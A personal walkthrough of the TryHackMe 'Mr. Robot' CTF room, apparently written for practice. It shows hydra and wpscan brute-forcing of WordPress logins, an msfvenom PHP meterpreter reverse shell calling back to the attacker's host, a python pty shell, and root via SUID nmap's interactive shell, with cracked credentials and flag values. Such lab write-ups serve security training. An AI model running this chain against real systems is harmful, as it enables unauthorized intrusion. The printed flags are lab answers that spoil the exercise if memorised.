#   Tryhackme - Mr. Robot CTF
### Walkthrough
```
By 
Shaswata Saha
05-07-2023
6:30PM
```

### IP  =   10.10.166.19

### Nmap Scan
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-05 09:44 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:44
Completed NSE at 09:44, 0.00s elapsed
Initiating NSE at 09:44
Completed NSE at 09:44, 0.00s elapsed
Initiating NSE at 09:44
Completed NSE at 09:44, 0.00s elapsed
Initiating Ping Scan at 09:44
Scanning 10.10.166.19 [2 ports]
Completed Ping Scan at 09:44, 0.32s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:44
Completed Parallel DNS resolution of 1 host. at 09:44, 0.15s elapsed
Initiating Connect Scan at 09:44
Scanning 10.10.166.19 [1000 ports]
Discovered open port 80/tcp on 10.10.166.19
Discovered open port 443/tcp on 10.10.166.19
Completed Connect Scan at 09:44, 20.68s elapsed (1000 total ports)
Initiating Service scan at 09:44
Scanning 2 services on 10.10.166.19
Completed Service scan at 09:44, 16.23s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.166.19.
Initiating NSE at 09:44
Completed NSE at 09:45, 21.44s elapsed
Initiating NSE at 09:45
Completed NSE at 09:45, 4.30s elapsed
Initiating NSE at 09:45
Completed NSE at 09:45, 0.00s elapsed
Nmap scan report for 10.10.166.19
Host is up (0.27s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
|_http-title: 400 Bad Request

NSE: Script Post-scanning.
Initiating NSE at 09:45
Completed NSE at 09:45, 0.00s elapsed
Initiating NSE at 09:45
Completed NSE at 09:45, 0.00s elapsed
Initiating NSE at 09:45
Completed NSE at 09:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.09 seconds

```

##  The first flag is inside -->
robots/key-1-of-3.txt
```
073403c8a58a1f80d943455fb30724b9

```

1.  Downloaded the .dic file to use as bruteforce or to find repos.

2.  Gobuster gave us a /login/ page:
```bash
wpscan --url 10.10.166.19 --enumerate u 
```
To enumerate the users in the wordpress site.
No results...!

3.  Use burpsuite to get invalid token to place it at the hydra cmd line.

4.  Setting up proxy for hydra:
```
ERROR: Invalid username
log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username.
```

5.  Using hydra to get the username:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ hydra -L Desktop/tryhackme/Mr_Robot/fsocity.dic -p Documents/rockyou.txt 10.10.166.19 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username.' -I -v 

Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-05 10:45:30
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.166.19:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username.
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[80][http-post-form] host: 10.10.166.19   login: Elliot   password: Documents/rockyou.txt
^C[ERROR] Received signal 2, going down ...
[ERROR] Can not create restore file (./hydra.restore) - Permission denied

```

6.  Running wpscan on the user:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Mr_Robot]
└─$ wpscan --url 10.10.166.19 --passwords sorted.dic --usernames Elliot
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.166.19/ [10.10.166.19]
[+] Started: Wed Jul  5 11:18:37 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.166.19/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.166.19/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] The external WP-Cron seems to be enabled: http://10.10.166.19/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.166.19/c9fcb8f.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.166.19/c9fcb8f.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.166.19/wp-content/themes/twentyfifteen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://10.10.166.19/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.4
 | Style URL: http://10.10.166.19/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.166.19/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:46 <==============> (137 / 137) 100.00% Time: 00:00:46

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - Elliot / ER28-0652                                                               
All Found                                                                                    
Progress Time: 00:03:41 <==================                 > (12 / 22) 54.54%  ETA: ??:??:??

[!] Valid Combinations Found:
#  Username: Elliot, Password: ER28-0652

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Jul  5 11:23:30 2023
[+] Requests Done: 187
[+] Cached Requests: 6
[+] Data Sent: 47.983 KB
[+] Data Received: 1.496 MB
[+] Memory used: 311.57 MB
[+] Elapsed time: 00:04:53


```
### IP Change = 10.10.48.76
7.  Trying to reverse shell:
Creating a backdoor:
```bash
──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Mr_Robot]
|
└─$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.17.28.202 LPORT=4444 -f raw > shell.php
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1113 bytes

```

Uploading the shell.php file and getting its url:
```
http://10.10.48.76/wp-content/uploads/2023/07/shell.php

```

8.  When we curl to the uploaded file path in wordpress from terminal we get access to the reverse shell backdoor:

```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.17.28.202
LHOST => 10.17.28.202
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.17.28.202     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.17.28.202:4444 
[*] Sending stage (39927 bytes) to 10.10.48.76
[*] Meterpreter session 1 opened (10.17.28.202:4444 -> 10.10.48.76:33851) at 2023-07-05 12:21:49 -0400

meterpreter > ls
Listing: /opt/bitnami/apps/wordpress/htdocs/wp-content/uploads/2023/07
======================================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100664/rw-rw-r--  1113  fil   2023-07-05 11:59:45 -0400  shell.php

```

9.  Spawn a shell and then perform some operations like ls etc:
```bash
meterpreter > shell
Process 1998 created.
Channel 1 created.
ls
key-2-of-3.txt
password.raw-md5

su robot 
su: must be run from a terminal

```
We spawn a bash shell using python:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'    
```

10. Obtain the flag by accessing the robot user _flag-2-of-3.txt_

11. Check for SUID set files:
```bash
robot@linux:/$ find . -perm /4000      
find . -perm /4000
```

12. Found the nmap directory to be vulnerable.
```bash
nmap --interactive
```

13. Now get the root flag from _flag-3-of-3.txt_
```bash
nmap> !sh
!sh
# whoami
whoami
root
# cd ..
cd ..
# ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
# cd /root
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat fir
cat fir
cat: fir: No such file or directory
# cat key
cat key
cat: key: No such file or directory
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

>   Completed...!!!